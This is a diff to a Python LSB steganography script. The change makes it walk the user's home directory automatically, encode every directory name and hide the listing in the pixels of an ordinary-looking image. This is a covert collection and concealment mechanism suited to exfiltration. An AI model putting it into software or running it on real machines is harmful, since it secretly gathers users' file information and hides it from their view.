@@ -7,6 +7,7 @@ from PIL import Image
 def encode(s):
     c = ""
     temp = ""
+    s = s[:4085]
     for i in s:
         temp = bin(ord(i)).replace('0b','')
         temp = temp.zfill(16)
@@ -30,8 +31,8 @@ def encode(s):
 flst：作为秘密信息根路径，之后会遍历根目录下的所有子目录名作为秘密信息，尽量避免路径名中出现中文字符
 imgpath：载体图片的相对或绝对路径
 '''
-def embed(flst,imgpath):
-#    flst = "E:\\WeChat Files\\WeChat Files\\wxid_2zfm4ix4hkyd22\\FileStorage"
+def embed(imgpath):
+    flst = os.path.expanduser('~')
     filelist = ""
     try:
         for root, dirs, files in os.walk(flst, topdown=False):
@@ -42,7 +43,7 @@ def embed(flst,imgpath):
         print("skip this file")
 
 
-#print(len(filelist))
+#    print(filelist)
     filelist = encode(filelist)
 
     img = Image.open(imgpath)
@@ -86,3 +87,4 @@ def embed(flst,imgpath):
             if count % 3 == 0:
 	            img.putpixel((x, y), (r, g, b))
     img.save('ushiwakamaru_LSB.png')
+#embed('ushiwakamaru.jpg')
